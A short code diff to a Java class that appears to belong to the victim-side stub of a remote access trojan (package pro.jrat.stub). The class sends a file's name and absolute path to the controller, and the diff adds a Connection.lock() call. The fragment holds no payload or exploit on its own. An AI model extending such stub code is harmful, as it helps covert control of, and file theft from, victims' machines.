@@ -3,6 +3,7 @@ package pro.jrat.stub.packets.outgoing;
 import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
+import pro.jrat.stub.Connection;
 
 public class Packet29SendFile extends AbstractOutgoingPacket {
 
@@ -18,6 +19,8 @@ public class Packet29SendFile extends AbstractOutgoingPacket {
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		sw.writeLine(name);
 		sw.writeLine(absolutePath);
+		
+		Connection.lock();
 	}
 
 	@Override
